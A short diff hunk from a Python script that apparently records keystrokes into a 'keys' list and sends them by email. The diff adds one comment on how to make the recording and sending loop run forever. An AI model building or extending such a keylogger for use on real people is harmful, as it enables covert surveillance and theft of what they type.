@@ -64,6 +64,7 @@ def send_email(filename, attachment):
     s.quit()
 
 
+# replace with "while True" to infinitely record and send emails.
 while num_iter < num_iter_end:
     count = 0
     keys = []
